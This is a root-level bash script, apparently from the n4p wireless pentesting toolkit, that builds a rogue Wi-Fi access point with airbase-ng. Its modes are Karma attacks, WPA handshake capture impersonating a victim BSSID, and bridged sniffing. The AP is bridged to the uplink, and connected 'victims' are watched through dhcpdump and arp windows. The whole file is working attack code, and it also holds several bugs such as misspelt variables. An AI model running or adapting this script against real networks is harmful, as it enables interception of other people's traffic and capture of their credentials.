#!/bin/bash
##############################################
# Do all prerun variables and safty measures #
# before anything else starts happening      #
##############################################
if [[ $(id -u) != 0 ]]; then # Verify we are root if not exit
   echo "Please Run This Script As Root or With Sudo!" 1>&2
   exit 1
fi

#retrieve absolute path structures so we can use symlinks and config files
SOURCE="${BASH_SOURCE[0]}"
while [[ -h "$SOURCE" ]]; do # resolve $SOURCE until the file is no longer a symlink
    DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
    SOURCE="$(readlink "$SOURCE")"
    [[ $SOURCE != /* ]] && SOURCE="$DIR/$SOURCE" # if $SOURCE was a relative symlink, we need to resolve it's relativeness to the path where the symlink file was located
done
DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"

#######################################
# Building a sane working environment #
#######################################
get_name() # Retrieve the config values
{
    USE=$(grep $1 /etc/n4p/n4p.conf | awk -F= '{print $2}')
}

get_state() # Retrieve the state of interfaces
{
    STATE=$(ip addr list | grep -i $1 | grep -i DOWN | awk -Fstate '{print $2}' | cut -d ' ' -f 2)
}

get_inet() # Retrieve the ip of the interface
{
    INET=$(ip addr list | grep -i $1 | grep -i inet | awk '{print $2}')
}

get_RCstatus() # What is the status from OpenRC of the service
{
    STATUS=$(/etc/init.d/net.$1 status | sed 's/* status: //g' | cut -d ' ' -f 2)
}

depends()
{
    get_name "IFACE0="; IFACE0=$USE
    get_name "IFACE1="; IFACE1=$USE
    get_name "ESSID="; ESSID=$USE
    get_name "STATION="; STATION=$USE
    get_name "BSSID="; BSSID=$USE
    get_name "CHAN="; CHAN=$USE
    get_name "BEACON="; BEACON=$USE
    get_name "PPS="; PPS=$USE
    get_name "AP="; UAP=$USE
    get_name "BRIDGED="; BRIDGED=$USE
    get_name "BRIDGE_NAME="; BRIDGE_NAME=$USE
    get_name "ATTACK="; ATTACK=$USE
    get_name "VICTIM_BSSID="; VICTIM_BSSID=$USE
    get_name "TYPE="; TYPE=$USE
    get_name "ENCRYPTION="; ENCRYPTION=$USE
    get_name "MONITOR_MODE="; MONITOR_MODE=$USE
    IPT="/sbin/iptables"
    AP="at0"
    MON="${IFACE1}mon"
    VPN="tun0"
    VPNI="tap+"
    AP_GATEWAY=$(grep routers /etc/n4p/dhcpd.conf | awk -Frouters '{print $2}' | cut -d ';' -f 1 | cut -d ' ' -f 2)
    AP_SUBNET=$(grep netmask /etc/n4p/dhcpd.conf | awk -Fnetmask '{print $2}' | cut -d '{' -f 1 | cut -d ' ' -f 2 | cut -d ' ' -f 1)
    AP_IP=$(grep netmask /etc/n4p/dhcpd.conf | awk -Fnetmask '{print $1}' | cut -d ' ' -f 1)
    AP_BROADCAST=$(grep broadcast-address /etc/n4p/dhcpd.conf | awk -Fbroadcast-address '{print $2}' | cut -d ';' -f 1 | cut -d ' ' -f 2)
    # Text color variables
    TXT_UND=$(tput sgr 0 1)          # Underline
    TXT_BLD=$(tput bold)             # Bold
    BLD_RED=${txtbld}$(tput setaf 1) # red
    BLD_YEL=${txtbld}$(tput setaf 2) # Yellow
    BLD_ORA=${txtbld}$(tput setaf 3) # orange
    BLD_BLU=${txtbld}$(tput setaf 4) # blue
    BLD_PUR=${txtbld}$(tput setaf 5) # purple
    BLD_TEA=${txtbld}$(tput setaf 6) # teal
    BLD_WHT=${txtbld}$(tput setaf 7) # white
    TXT_RST=$(tput sgr0)             # Reset
    INFO=${BLD_WHT}*${TXT_RST}       # Feedback
    QUES=${BLD_BLU}?${TXT_RST}       # Questions
    PASS="${BLD_TEA}[${TXT_RSR}${BLD_WHT} OK ${TXT_RST}${BLD_TEA}]${TXT_RST}"
    WARN="${BLD_TEA}[${TXT_RST}${BLD_PUR} * ${TXT_RST}${BLD_TEA}]${TXT_RST}"
    # Start text with $BLD_YEL variable and end the text with $TXT_RST
}
banner()
{ 
    echo "${BLD_TEA}$(cat /usr/share/n4p/auth.logo)${TXT_RST}"; sleep 3
}
setupenv()
{
    # Checked for orphaned processes then sanitize them
    if [[ -n $(ps -A | grep -i airbase) ]]; then echo "$WARN Leftover scoobie snacks found! nom nom"; killall airbase-ng; fi
    
    sessionfolder=/tmp/n4p # Set our tmp working configuration directory and then build config files
    [[ ! -d "$sessionfolder" ]] && mkdir "$sessionfolder"; mkdir -p "$sessionfolder" "$sessionfolder/logs"
    [[ -n $(rfkill list | grep yes) ]] && rfkill unblock 0
}

settings()
{
    if [[ -e /etc/init.d/net.$IFACE1 ]]; then
        echo "$INFO Getting status of $IFACE1"
        get_RCstatus "$IFACE1"
        [[ $STATUS == 'started' ]] && /etc/init.d/net.$IFACE1 stop
    fi

    [[ -z $(ip addr | grep -i "$MON") ]] && iwconfig $IFACE1 mode managed # Force managed mode upon wlan because airmon wont do this
}

keepalive()
{
    read -p "$WARN Press ctrl^c when you are ready to go down!" ALLINTHEFAMILY # Protect this script from going down hastily
    [[ $ALLINTHEFAMILY != 'SGFjayBUaGUgUGxhbmV0IQ==' ]] && clear; keepalive
}

killemAll()
{
    echo -e "\n\n$WARN The script has died. Major network configurations have been modified.\nWe must go down cleanly or your system will be left in a broken state!"
    pkill airbase-ng
    airmon-zc stop $MON

    [[ $BRIDGED == "True" ]] && rebuild_network
    echo "$INFO The environment is now sanitized cya"
    exit 0
}

rebuild_network()
{
    get_RCstatus $BRIDGE
    [[ $STATUS == 'started' ]] && /etc/init.d/net.$BRIDGE stop
        
    get_state "$BRDIGE"
    [[ $STATE != 'DOWN' ]] && ip link set $BRDIGE down
        
    brctl delif "$BRIDGE $RESP_BR_1"
    brctl delif "$BRIDGE $RESP_BR_2"
    brctl delbr "$BRIDGE"
    brctl show
    
    echo "$INFO It's now time to bring your default network interface back up"
    get_RCstatus "$IFACE0"
    if [[ $STATUS != 'started' ]]; then
        get_state "$IFACE0"
        [[ $STATE == 'DOWN' ]] && ip link set $IFACE0 up
        /etc/init.d/net.$IFACE0 start
    fi
    echo "$INFO The environment is now sanitized cya"
    exit 0
}
trap killemAll INT HUP;

##################################################################
###############Setup for Airbase-ng and airmon-zc#################
##################################################################
startairbase()
{
    [[ -z $(ip addr | grep -i "$MON") ]] && airmon-zc start $IFACE1 || echo "faild airmon"

    if [[ $MENUCHOICE == 1 ]]; then
        echo -n "$INFO STARTING SERVICE: AIRBASE-NG"
        if [[ $ATTACK == "Handshake" ]]; then
            airbase-ng -$TYPE $ENCRYPTION -c $CHAN -a $VICTIM_BSSID -e $ESSID -v $MON > $sessionfolder/logs/airbase-ng.log &
        elif [[ $ATTACK == "Karma" ]]; then
            airbase-ng -c $CHAN -x $PPS -I $BEACON -a $BSSID -e $ESSID -P -C 15 -v $MON > $sessionfolder/logs/airbase-ng.log &
        else # This just gives us an AP for Sniffing
            airbase-ng -c $CHAN -x $PPS -I $BEACON -e -a $BSSID $ESSID -P -v $MON > $sessionfolder/logs/airbase-ng.log &
        fi
        sleep 1.5
    fi

    echo -ne "\n$INFO Assigning IP and Route to $AP\n"
    get_state "$AP"
    while [[ $STATE == 'DOWN' || -z $(ip addr list | grep $AP) ]]; do #check AP state if down go up, if AP has not loaded yet wait a bit
        sleep 0.3
        ip link set $AP up
        get_state "$AP"
    done
    # setting ip and route doesn't always take, lets ensure it sticks and check no other routes or ip's are getting assigned not by us then remove them if so.
    local CHK_GATEWAY=$(ip addr | grep $AP | grep -i inet | awk -Finet '{print $2}' | awk -F brd '{print $1}' | cut -d ' ' -f 2)
    [[ -n $CHK_GATEWAY && $CHK_GATEWAY != "${AP_GATEWAY}/32" ]] && ip addr del $CHK_IP dev $AP

    local CHK_IP=$(ip route | grep $AP | awk -Fvia '{print $1}' | cut -d ' ' -f 1)
    [[ -n $CHK_IP && $CHK_IP != "${AP_IP}/24" ]] && ip route flush $CHK_IP

    while [[ -z $(ip addr | grep $AP | grep -i inet | awk -Finet '{print $2}' | awk -F/ '{print $1}') ]]; do
        sleep 0.3
        ip addr add $AP_GATEWAY broadcast $AP_BROADCAST dev $AP
    done

    while [[ -z $(route -n | grep $AP | grep $AP_GATEWAY ) ]]; do
        sleep 0.3
        route add -net $AP_IP netmask $AP_SUBNET gw $AP_GATEWAY
    done
    route -n
    AIRBASE="On"
    [[ $ATTACK != "Handshake" ]] && monitor $AP
}

starthostapd()
{
    monitor $IFACE1
}

monitor()
{
    if [[ -n $MONITOR_MODE ]]; then
        if [[ $MONITOR_MODE == "Custom" ]]; then
            xterm -hold -geometry 60x35 -bg black -fg blue -T "N4P Victims" -e $DIR/./monitor.sh $1 &>/dev/null &
        elif [[ $MONITOR_MODE == "dhcpdump" ]]; then
            xterm -hold -bg black -fg blue -T "N4P Victims" -geometry 65x15 -e dhcpdump -i $1 &>/dev/null &
        elif [[ $MONITOR_MODE == "arp" ]]; then
            xterm -hold -bg black -fg blue -T "N4P Victims" -geometry 65x15 -e arp -a -i $1 &>/dev/null &
        fi
    fi
}

#################################################################
#################Verify our DHCP and bridge needs################
#################################################################
openrc_bridge()
{
    # OpenRC needs sym links to bring the interface up. Verify they exist as needed if not make them then set proper state
    if [[ -e /etc/init.d/net.$BRIDGE ]]; then
        get_RCstatus "$BRIDGE"
        [[ $STATUS == 'started' ]] && /etc/init.d/net.$BRIDGE stop; sleep 1; ip link set $BRIDGE down
    else
        ln -s /etc/init.d/net.lo /etc/init.d/net.$BRIDGE
    fi

    if [[ -e /etc/init.d/net.$RESP_BR_1 ]]; then
        get_RCstatus "$RESP_BR_1"
        [[ $STATUS == 'started' ]] && /etc/init.d/net.$RESP_BR_1 stop; sleep 1; ip link set $RESP_BR_1 down
    fi

    if [[ -e /etc/init.d/net.$RESP_BR_2 ]]; then
        get_RCstatus "$RESP_BR_2"
        [[ $STATUS == 'started' ]] && /etc/init.d/net.$RESP_BR_2 stop; sleep 1; ip link set $RESP_BR_2 down
    fi

    # This insures $RESP_BR_1 & RESP_BR_2 does not have an ip and then removes it if it does since the bridge handles this
    get_inet "$RESP_BR_1"
    [[ -n $INET ]] && ip addr del $CHK_IP dev $RESP_BR_1

    get_inet "$RESP_BR_2"
    [[ -n $INET ]] && ip addr del $CHK_IP dev $RESP_BR_2

    echo -ne "\n Building $BRIDGE now with $BRIDGE $RESP_BR_2 $BRIDGE_RESP_BR_1"
    [[ $UAP == "HOSTAPD" ]] && iw dev $RESP_BR_2 set 4addr on

    get_state "$RESP_BR_2"
    while [[ $STATE == 'DOWN' || -z $(ip addr list | grep $RESP_BR_2) ]]; do 
        sleep 0.2
        ip link set $RESP_BR_2 up
        get_state "$RESP_BR_2"
    done

    get_state "$RESP_BR_1"
    while [[ $STATE == 'DOWN' || -z $(ip addr list | grep $RESP_BR_1) ]]; do 
        sleep 0.2
        ip link set $RESP_BR_1 up
        get_state "$RESP_BR_1"
    done
    sleep 2
    brctl addbr $BRIDGE
    sleep 0.3
    brctl addif $BRIDGE $RESP_BR_1
    sleep 0.3
    brctl addif $BRIDGE $RESP_BR_2
    sleep 0.3
    ip link set $BRIDGE up
}

fbridge()
{
    if [[ $BRIDGED == "True" ]]; then
        RESP_BR_1=$IFACE0
        [[ $AIRBASE == 'On' ]] && RESP_BR_2=$AP || RESP_BR_2=$IFACE1
        openrc_bridge
    elif [[ $BRIDGED != "False" ]]; then
        echo "echo [$WARN] ERROR in n4p.conf configuration file, no Bridge found"
    fi
}

dhcp()
{
    if [[ -n $(grep -i Pentesters_AP /etc/dhcp/dhcpd.conf | awk '{print $2}') ]]; then
        [[ $BRIDGED != 'True' ]] && /etc/init.d/dhcpd restart || /etc/init.d/net.$BRIDGE start
    else # We apparently don't have the proper configuration file. Make the changes
        find * -wholename /etc/n4p/dhcpd.conf -exec cat {} >> /etc/dhcp/dhcpd.conf \;
        dhcp
    fi
}


##################################################################
########################Start the menu############################
##################################################################
menu()
{
    if [[ $UAP == "AIRBASE" ]]; then
        MENUCHOICE=1
    elif [[ $UAP == "HOSTAPD" ]]; then
        MENUCHOICE=2
    else
        echo "${BLD_ORA}
        +==================+
        | 1) Airbase-NG    |
        | 2) Hostapd       |
        +==================+${TXT_RST}"
        read -e -p "Option: " MENUCHOICE
    fi
    
    if [[ $MENUCHOICE == 1 ]]; then
        startairbase; fbridge; dhcp; keepalive
    elif [[ MENUCHOICE == 2 ]]; then
        echo "Option Available Next Release"
    else 
        clear; echo "$WARN Invalid option"; menu
    fi
}
go() 
{
    depends
    banner
    setupenv
    settings
    menu
}
go